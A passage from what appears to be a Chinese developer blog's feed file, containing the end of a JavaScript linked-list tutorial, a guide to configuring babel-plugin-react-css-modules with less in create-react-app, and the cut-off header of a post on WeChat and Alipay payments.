title="2.2 链表结构的构建"></a>2.2 链表结构的构建</h2><p>虽然我们已经构建出了链表节点的结构，但是我们还未对整个链表的整体结构进行一个定义。一个链表的整体结构是由一个 Head 节点出发的，因此 Head 节点是链表实例上的一个属性，同时节点数也是一个链表的属性，此外链表上还拥有各种各样的方法，以便于我们去打印链表、添加节点、删除节点、查找节点。</p><p>因此我们可以构建出一下一个链表的基本结构，随后再对链表的内置方法进行定义：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">LinkedList</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">count</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">head</span> = <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">print</span>(<span class="params"></span>) &#123; <span class="comment">/** 具体实现 */</span> &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="title function_">push</span>(<span class="params">value</span>) &#123; <span class="comment">/** 具体实现 */</span> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-3-打印链表"><a href="#2-3-打印链表" class="headerlink" title="2.3 打印链表"></a>2.3 打印链表</h2><p>打印链表需要从链表头部开始打印，依次向后重复取值，指导取值为 null 时停止取值</p><p><img src="http://img.cdn.esunr.xyz/markdown/20200514174717.png" alt=""></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">print</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> res = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="keyword">let</span> cur = <span class="variable language_">this</span>.<span class="property">head</span>;</span><br><span class="line">  <span class="keyword">while</span> (cur !== <span class="literal">null</span>) &#123;</span><br><span class="line">    cur.<span class="property">next</span> === <span class="literal">null</span></span><br><span class="line">      ? (res += cur.<span class="property">value</span>)</span><br><span class="line">      : (res += cur.<span class="property">value</span> + <span class="string">&quot;=&gt;&quot;</span>);</span><br><span class="line">    cur = cur.<span class="property">next</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-4-向链表尾部添加元素"><a href="#2-4-向链表尾部添加元素" class="headerlink" title="2.4 向链表尾部添加元素"></a>2.4 向链表尾部添加元素</h2><p>为链表添加节点分两种情况：</p><ul><li>如果链表中没有节点（<code>this.head === null</code>），则新增节点作为 head</li><li>如果链表中有节点，则在链表最后一位添加节点</li></ul><p><img src="http://img.cdn.esunr.xyz/markdown/20200514175453.png" alt=""></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">push</span>(<span class="params">value</span>) &#123;</span><br><span class="line">  <span class="comment">// 新结点</span></span><br><span class="line">  <span class="keyword">let</span> newNode = <span class="keyword">new</span> <span class="title class_">Node</span>(value);</span><br><span class="line">  <span class="comment">// 如果是头节点为空就将新节点放到头结点上</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">head</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">head</span> = newNode;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 否则将新节点放到链表的末尾</span></span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> cur = <span class="variable language_">this</span>.<span class="property">head</span>;</span><br><span class="line">    <span class="keyword">while</span> (cur.<span class="property">next</span> !== <span class="literal">null</span>) &#123;</span><br><span class="line">      cur = cur.<span class="property">next</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cur.<span class="property">next</span> = newNode;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">count</span>++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-5-删除节点"><a href="#2-5-删除节点" class="headerlink" title="2.5 删除节点"></a>2.5 删除节点</h2><p>删除节点也分两种情况：</p><ul><li>如果是移除第一项，就将链表的 head 转移给第二个节点</li><li>如果移除的不是第一项，就找到目标索引对应的节点，将节点的上一个节点的 next 指向，改为下一个节点上</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">removeAt</span>(<span class="params">index</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (index &lt; <span class="number">0</span> || index &gt; <span class="variable language_">this</span>.<span class="property">count</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;索引值不存在&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 如果是移除第一项，就将链表的 head 转移给第二个节点</span></span><br><span class="line">  <span class="keyword">if</span> (index === <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">head</span> = <span class="variable language_">this</span>.<span class="property">head</span>.<span class="property">next</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 如果移除的不是第一项，就找到目标索引对应的节点，</span></span><br><span class="line">  <span class="comment">// 将节点的上一个节点的 next 指向，改为下一个节点上</span></span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> cur = <span class="variable language_">this</span>.<span class="property">head</span>;</span><br><span class="line">    <span class="keyword">let</span> prev;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; index; i++) &#123;</span><br><span class="line">      prev = cur;</span><br><span class="line">      cur = cur.<span class="property">next</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 更改目标节点上一个节点的指向</span></span><br><span class="line">    prev.<span class="property">next</span> = cur.<span class="property">next</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> Javascript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>babel-plugin-react-css-modules使用指南：在React中更好的使用CSS-Modules</title>
      <link href="/2020/04/d772990d7195.html"/>
      <url>/2020/04/d772990d7195.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-babel-plugin-react-css-modules-简述"><a href="#1-babel-plugin-react-css-modules-简述" class="headerlink" title="1. babel-plugin-react-css-modules 简述"></a>1. babel-plugin-react-css-modules 简述</h1><p>在 React 中对于 CSS 的解决方案通常有以下几种：</p><ul><li>Css 命名区间</li><li>Css in Js</li><li>Css Components</li><li>Css Modules</li></ul><p>个人比较喜欢使用 CSS Modules 的引入方式，但是其也有不方便的地方，由于其是基于判断 Class 来引入样式的，所以每次定义 Class 时总是需要调用 Css Modules 对象然后读取其某个 Class，如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> style <span class="keyword">from</span> <span class="string">&quot;./style.modules.css&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ... JSX ...</span></span><br><span class="line"><span class="keyword">let</span> <span class="title function_">Test</span> = (<span class="params"></span>) =&gt; (</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&#123;style.test&#125;</span>&gt;</span>test text<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">)</span><br><span class="line"><span class="comment">// ... JSX ...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">Test</span></span><br></pre></td></tr></table></figure><p>同时，使用 Css Module 如果引入了不存在 class 也不会报错。</p><p>那么为了解决这一问题，<a href="https://github.com/gajus/react-css-modules">react-css-modules</a> 应运而生，其利用高阶组件的方式去自动将 className 中的样式连接到 CSS Modules 上，这样只需要只需要简单的书写 className 即可：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> style <span class="keyword">from</span> <span class="string">&quot;./style.modules.css&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">CssModule</span> <span class="keyword">from</span> <span class="string">&quot;react-css-modules&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ... JSX ...</span></span><br><span class="line"><span class="keyword">let</span> <span class="title function_">Test</span> = (<span class="params"></span>) =&gt; (</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;test&quot;</span>&gt;</span>test text<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">)</span><br><span class="line"><span class="comment">// ... JSX ...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">CssModule</span>(style, <span class="title class_">Test</span>)</span><br></pre></td></tr></table></figure><p>但其仍有缺点，就是该插件是在运行时编译的，在虚拟 DOM 的生成中修改了 className，这样就会消耗客户端一定的性能，同时该插件已经停止维护，因此作者推荐使用 <a href="https://github.com/gajus/babel-plugin-react-css-modules">babel-plugin-react-css-modules</a> 来进行替代。</p><p>与 react-css-modules 不同的是，babel-plugin-react-css-modules 借助 Babel 可以让 React 应用在构建时就直接替换掉 className 中的值，这样就会极高的提升性能。同时为了与 className 不冲突，babel-plugin-react-css-modules 规定了如果是引用 CSS Modules 中的 class 的话，可以使用 styleName 来进行样式的定义，如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;./style.module.css&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="title function_">Test</span> = (<span class="params"></span>) =&gt; (</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">styleName</span>=<span class="string">&quot;test&quot;</span>&gt;</span>test text<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">Test</span></span><br></pre></td></tr></table></figure><h1 id="2-插件配置"><a href="#2-插件配置" class="headerlink" title="2. 插件配置"></a>2. 插件配置</h1><h2 id="2-1-前期准备"><a href="#2-1-前期准备" class="headerlink" title="2.1 前期准备"></a>2.1 前期准备</h2><p>由于在 React 项目中，最常见的脚手架工具为 create-react-app，因此在此以该脚手架工具为示例，演示如何配置 babel-plugin-react-css-modules，并使其支持 less。</p><p>首先我们要安装插件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install post-less -D # 对 less 语法进行处理，如果要处理 sass 这里就安装 post-sass</span><br><span class="line">npm install babel-plugin-react-css-modules -S</span><br></pre></td></tr></table></figure><p>这里要注意 babel-plugin-react-css-modules 需要作为运行时依赖安装，原因如下：</p><blockquote><p>当babel-plugin-react-css-modules无法在编译时解析CSS模块时，它将导入一个辅助函数（读取运行时styleName解析）。因此，您必须安装babel-plugin-react-css-modules作为项目的直接依赖项。</p></blockquote><p>由于这一部分需要修改 create-react-app 的 webpack 配置，因此我们还要通过逆向工程解构出 webpack 的配置：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yarn run eject</span><br></pre></td></tr></table></figure><h2 id="2-2-修改-babel-配置"><a href="#2-2-修改-babel-配置" class="headerlink" title="2.2 修改 babel 配置"></a>2.2 修改 babel 配置</h2><p>babel-plugin-react-css-modules 基于 babel，其也是作为一个 babel 插件使用，所以按照官方文档，我们应该在 <code>.babelrc</code> 文件中配置该插件。由于 create-react-app 将 babel 配置文件集成到了 package.json 中，因此我们需要修改 package.json 的 babel 选项：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// package.json</span></span><br><span class="line"><span class="comment">// ... ...</span></span><br><span class="line"><span class="attr">&quot;babel&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;presets&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="string">&quot;react-app&quot;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;plugins&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">[</span><span class="string">&quot;react-css-modules&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;generateScopedName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;[local]-[hash:base64:10]&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;filetypes&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;.less&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;syntax&quot;</span><span class="punctuation">:</span> <span class="string">&quot;postcss-less&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="comment">// ... ...</span></span><br></pre></td></tr></table></figure><p>这一步的目的是为了让 babel 在编译 js、jsx 文件时，将 JSX 语法中的 styleName 后缀一个 hash 值，并将其添加到 className 中，<code>generateScopedName</code> 选项控制了我们编译后的 className 的格式。同时为了支持 less，需要在 <code>filetypes</code> 选项中添加 postcss-less 以支持读取 less 文件(sass 则是添加 post-sass)。</p><p>此外，除了在 .babelrc 以及 package.json 文件中配置 babel 插件之外，我们还可以在 webpack 的 babel-lader 部分来配置这些信息，打开已经结构的 webpack 配置，找到 babel-loader 部分的配置，将其修改为：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Process application JS with Babel.</span></span><br><span class="line"><span class="comment">// The preset includes JSX, Flow, TypeScript, and some ESnext features.</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">test</span>: <span class="regexp">/\.(js|mjs|jsx|ts|tsx)$/</span>,</span><br><span class="line">  <span class="attr">include</span>: paths.<span class="property">appSrc</span>,</span><br><span class="line">  <span class="attr">loader</span>: <span class="built_in">require</span>.<span class="title function_">resolve</span>(<span class="string">&quot;babel-loader&quot;</span>),</span><br><span class="line">  <span class="attr">options</span>: &#123;</span><br><span class="line">    <span class="attr">customize</span>: <span class="built_in">require</span>.<span class="title function_">resolve</span>(</span><br><span class="line">      <span class="string">&quot;babel-preset-react-app/webpack-overrides&quot;</span></span><br><span class="line">    ),</span><br><span class="line"></span><br><span class="line">    <span class="attr">plugins</span>: [</span><br><span class="line">      [</span><br><span class="line">        <span class="built_in">require</span>.<span class="title function_">resolve</span>(<span class="string">&quot;babel-plugin-named-asset-import&quot;</span>),</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">loaderMap</span>: &#123;</span><br><span class="line">            <span class="attr">svg</span>: &#123;</span><br><span class="line">              <span class="title class_">ReactComponent</span>:</span><br><span class="line">                <span class="string">&quot;@svgr/webpack?-svgo,+titleProp,+ref![path]&quot;</span>,</span><br><span class="line">            &#125;,</span><br><span class="line">          &#125;,</span><br><span class="line">        &#125;,</span><br><span class="line">      ],</span><br><span class="line">      <span class="comment">// ---- 新增 ----</span></span><br><span class="line">      [</span><br><span class="line">        <span class="string">&quot;react-css-modules&quot;</span>,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">generateScopedName</span>: <span class="string">&quot;[local]-[hash:base64:10]&quot;</span>,</span><br><span class="line">          <span class="attr">filetypes</span>: &#123;</span><br><span class="line">            <span class="string">&quot;.less&quot;</span>: &#123;</span><br><span class="line">              <span class="attr">syntax</span>: <span class="string">&quot;postcss-less&quot;</span>,</span><br><span class="line">            &#125;,</span><br><span class="line">          &#125;,</span><br><span class="line">        &#125;,</span><br><span class="line">      ],</span><br><span class="line">      <span class="comment">// ---- 新增 ----</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="comment">// This is a feature of `babel-loader` for webpack (not Babel itself).</span></span><br><span class="line">    <span class="comment">// It enables caching results in ./node_modules/.cache/babel-loader/</span></span><br><span class="line">    <span class="comment">// directory for faster rebuilds.</span></span><br><span class="line">    <span class="attr">cacheDirectory</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="comment">// See #6846 for context on why cacheCompression is disabled</span></span><br><span class="line">    <span class="attr">cacheCompression</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">compact</span>: isEnvProduction,</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-3-修改-css-loader-配置"><a href="#2-3-修改-css-loader-配置" class="headerlink" title="2.3 修改 css-loader 配置"></a>2.3 修改 css-loader 配置</h2><p>我们目前已经可以使用标签的 styleName 属性了，我们可以在审查元素中看到，使用了 styleName 标签的 DOM 节点上，在 class 中出现了类似 <code>test-bs6rG6AQFi</code> 这样的 className，但此时样式还不会被应用，因为我们现在只处理了 jsx，还未处理 css 文件。</p><p>在 css-loader 中有一个 modules 配置选项，该配置项决定了是否开启 css modules，同时规定了 css modules 模式下的一些规范。因此在这一步，我们的目标就是让 css-loader 在处理 css 时启用 css modules 并且 css modules 的 class 命名格式要与 jsx 中的 styleName 处理后的命名格式相同，即都为 <code>[local]-[hash:base64:10]</code>。</p><p>create-react-app 中默认开启了 sass 的 css module，但是没有支持 less，因此我们先将 less 的 loader 添加上，并且开启 css module，同时配置 css-loader 的配置项，让其命名能够一致：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// webpack.config.js</span></span><br><span class="line"><span class="comment">// 找到定义匹配 laoder 正则表达式的代码，并在后面追加 lessRegex 与 lessModuleRegex</span></span><br><span class="line"><span class="keyword">const</span> cssRegex = <span class="regexp">/\.css$/</span>;</span><br><span class="line"><span class="keyword">const</span> cssModuleRegex = <span class="regexp">/\.module\.css$/</span>;</span><br><span class="line"><span class="keyword">const</span> sassRegex = <span class="regexp">/\.(scss|sass)$/</span>;</span><br><span class="line"><span class="keyword">const</span> sassModuleRegex = <span class="regexp">/\.module\.(scss|sass)$/</span>;</span><br><span class="line"><span class="keyword">const</span> lessRegex = <span class="regexp">/\.less$/</span>; <span class="comment">// 新增</span></span><br><span class="line"><span class="keyword">const</span> lessModuleRegex = <span class="regexp">/\.module\.less$/</span>; <span class="comment">// 新增</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ... ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// create-react-app 在 module.rules 中配置 相应文件的 loader</span></span><br><span class="line"><span class="comment">// 我们参考 sass-loader 的配置来配置 less-loader</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">test</span>: lessRegex, <span class="comment">// 如果是 xxx.less 文件，而不是 xxx.module.less 文件，就不开启 css module，仅正常引入该 less 文件</span></span><br><span class="line">  <span class="attr">exclude</span>: lessModuleRegex,</span><br><span class="line">  <span class="attr">use</span>: <span class="title function_">getStyleLoaders</span>(</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">importLoaders</span>: <span class="number">3</span>,</span><br><span class="line">      <span class="attr">sourceMap</span>: isEnvProduction &amp;&amp; shouldUseSourceMap,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;less-loader&quot;</span></span><br><span class="line">  ),</span><br><span class="line">  <span class="attr">sideEffects</span>: <span class="literal">true</span>,</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">test</span>: lessModuleRegex, <span class="comment">// 如果是 xxx.module.less 文件，就开启 css module</span></span><br><span class="line">  <span class="comment">// getStyleLoaders 是 create-react-app 在 webpack 中定义的一个方法</span></span><br><span class="line">  <span class="comment">// 其目的是为了让所有 css 相关的 loader 最终都能被 css-loader 接管处理</span></span><br><span class="line">  <span class="comment">// 其提供了两个参数：</span></span><br><span class="line">  <span class="comment">// 1. options：定义 css-loader 的配置项</span></span><br><span class="line">  <span class="comment">// 2. pre：在 css-loader 之前进行的 loader</span></span><br><span class="line">  <span class="attr">use</span>: <span class="title function_">getStyleLoaders</span>(</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">importLoaders</span>: <span class="number">3</span>,</span><br><span class="line">      <span class="attr">sourceMap</span>: isEnvProduction &amp;&amp; shouldUseSourceMap,</span><br><span class="line">      <span class="attr">modules</span>: &#123;</span><br><span class="line">        <span class="comment">/** </span></span><br><span class="line"><span class="comment">        getCSSModuleLocalIdent 是 create-react-app 默认引入的一个方法，</span></span><br><span class="line"><span class="comment">        其作用是将处理后的 css module 重命名为规范的格式，</span></span><br><span class="line"><span class="comment">        原有的明明格式与我们需要的格式不一样（我们需要的格式为 [local]-[hash:base64:10]）,</span></span><br><span class="line"><span class="comment">        因此需要注释掉该配置项，否则我们接下来的配置不会生效</span></span><br><span class="line"><span class="comment">        **/</span></span><br><span class="line">        <span class="comment">// getLocalIdent: getCSSModuleLocalIdent,</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// localIdentName 规范了 css module 中 class 的命名格式，这里与我们 babel 中的配置要一致</span></span><br><span class="line">        <span class="attr">localIdentName</span>: <span class="string">&quot;[local]-[hash:base64:10]&quot;</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;less-loader&quot;</span></span><br><span class="line">  ),</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h1 id="3-使用测试"><a href="#3-使用测试" class="headerlink" title="3. 使用测试"></a>3. 使用测试</h1><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.test</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span> <span class="keyword">from</span> <span class="string">&quot;react&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./style.module.less&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Layout</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span> &#123;</span><br><span class="line">  <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;layout&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">styleName</span>=<span class="string">&quot;test&quot;</span>&gt;</span>localIdentName<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">Layout</span>;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> React </category>
          
      </categories>
      
      
        <tags>
            
            <tag> React </tag>
            
            <tag> webpack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端微信支付与支付宝支付的坑</title>
      <link href="/2020/04/f662d16aeaaa.html"/>
      <url>/2020/04/f662d16aeaaa.html</url>
      
